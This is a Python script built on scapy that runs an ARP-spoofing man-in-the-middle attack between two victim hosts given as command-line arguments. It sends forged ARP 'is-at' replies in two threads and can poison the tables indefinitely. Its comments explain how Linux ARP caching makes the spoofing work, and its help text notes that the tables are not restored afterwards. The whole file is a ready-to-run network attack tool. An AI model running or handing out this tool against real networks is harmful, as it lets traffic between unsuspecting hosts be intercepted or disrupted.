import threading
import argparse
import logging
import time
import sys
from scapy.all import ARP, send


# function which poisons the ARP table of a host, sending
# 'numberOfTries' requests with a 'timeout' pause inbetween
def poisonTableOfHost(targetIP, ipToDisguiseAs, numberOfTries, timeout):
    # make the 'scapy' logger less verbose
    logging.getLogger('scapy').setLevel(logging.ERROR)
    # will generate the following packet:
    # ###[ ARP ]###
    # hwtype = Ethernet (10Mb)
    # ptype = IPv4
    # op = is-at
    # hwsrc = host-mac
    # psrc = ipToDisguiseAs
    # hwdst = 00:00:00:00:00:00
    # pdst = targetIP
    #
    # experimentally, it seems that Linux drops unsolicited ARP replies containing
    # source IP addresses which have not already been cached into the table;
    # when the source IP address of an ARP reply packet is already stored in the
    # table, the OS will simply update the existing entry. updates also occur when
    # receiving a 'who-has' request from another host or when issuing one itself;
    # the default 'op' type is a 'who-has' request, which will be replaced with a
    # 'is-at' reply, while the MAC address of the host (hwsrc) gets filled out
    # automatically;
    # scapy makes a broadcast request for the MAC address (hwdst) of the target,
    # regardless of it being specified or not, which means it can be omitted;
    # only after this initial request is the actually intended packet sent;
    # therefore, the only fields to provide are op-code, the ip of the target (pdst)
    # and the ip of the sender (psrc), which will be changed to that of the machine
    # we wish to disguise as;
    arpPacket = ARP(pdst=targetIP, psrc=ipToDisguiseAs, op='is-at')

    for _ in range(numberOfTries):
        send(arpPacket)
        time.sleep(timeout)


# defining the argument parser of the CLI
parser = argparse.ArgumentParser(
    description='Executes an ARP man-in-the-middle attack between two specified hosts.',
    epilog='This script will not restore the ARP tables to their original state after termination. Clean your own mess up!'
)

# exactly 2 arguments expected for the 'victim' flag (the two targets); the name
# of each argument used in the auto-generated help menu is described by 'metavar'
parser.add_argument('-v', '--victims', nargs=2, required=True, type=str, dest='victims',
                    help='the IPs of the two target hosts', metavar='VICTIM')
parser.add_argument('-n', '--number-of-tries', default=10, type=int, dest='numberOfTries',
                    help='number of requests per victim; when negative values are provided, no limit will be set; defaults to 10',
                    metavar='NUMBER-OF-TRIES')
parser.add_argument('-t', '--timeout', default=2, type=int, dest='timeout',
                    help='time between requests; defaults to 2s')

# arguments stores the provided values
arguments = parser.parse_args()


if arguments.numberOfTries < 0:
    arguments.numberOfTries = sys.maxsize

try:
    # each thread starts an instance of the 'poisonTableOfHost'
    # function with the provided arguments;
    # both threads are created as daemons, since they should
    # terminate whenever the main thread halts its execution
    firstThread = threading.Thread(target=poisonTableOfHost, args=(
    arguments.victims[0], arguments.victims[1], arguments.numberOfTries, arguments.timeout), daemon=True)
    secondThread = threading.Thread(target=poisonTableOfHost, args=(
    arguments.victims[1], arguments.victims[0], arguments.numberOfTries, arguments.timeout), daemon=True)

    print('[*] ARP Spoofing initiated')
    print('[*] Table poisoning in progress...')
    firstThread.start()
    secondThread.start()

    # the main thread waits for both threads to quit
    firstThread.join()
    secondThread.join()

    print('[*] Goodbye!')
except KeyboardInterrupt:
    print('[*] Goodbye!')
